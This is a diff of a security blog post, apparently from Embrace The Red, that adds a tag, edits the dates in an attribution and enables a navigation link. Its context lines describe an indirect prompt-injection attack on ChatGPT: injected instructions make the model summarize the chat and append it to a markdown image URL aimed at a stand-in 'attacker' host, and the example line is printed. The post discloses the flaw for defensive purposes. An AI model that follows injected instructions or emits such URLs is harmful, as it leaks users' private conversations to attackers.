@@ -23,6 +23,8 @@
   
   <meta property="og:article:tag" content="ai injections" />
   
+  <meta property="og:article:tag" content="chatgpt" />
+  
   
 
   <title>
@@ -139,6 +141,8 @@
         
         <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ai-injections">#ai injections</a></span>
         
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/chatgpt">#chatgpt</a></span>
+        
       </div>
     </div>
   </header>
@@ -152,7 +156,7 @@
 <p>Basically, if the LLM returns a markdown image in the form of</p>
 <pre tabindex="0"><code>![data exfiltration in progress](https://attacker/q=*exfil_data*)
 </code></pre><p>ChatGPT will render it automatically and retrieve the URL. During an Indirect Prompt Injection the adversary controls what the LLM is doing (I call it AI Injection for a reason), and it can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data.</p>
-<p>I&rsquo;m not the only one who points this out, <a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before</a>. Roman found it March 14th. I ran across it separatley a few weeks after.</p>
+<p>I&rsquo;m not the only one who points this out, <a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before</a>. Roman found it end of March, and I ran across it independently a few days later in early April.</p>
 <h3 id="proof-of-concept-demonstration">Proof of Concept Demonstration</h3>
 <p>This is possible with plugins, e.g. via the <code>WebPilot Plugin</code> or check out the <a href="/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/">YouTube Transcript Plugin Injection</a> I posted about the other day.</p>
 <p>The LLM&rsquo;s response can contain markdown (or instruct the AI to build it on the fly), summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker.</p>
@@ -206,7 +210,7 @@
     
     <ul class="pager">
       
-      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      <li class="next"><a href="https://embracethered.com/blog/posts/2023/chatgpt-cross-plugin-request-forgery-and-prompt-injection./">Newer <span aria-hidden="true">&rarr;</span></a></li>
       
       
       <li class="author-contact">
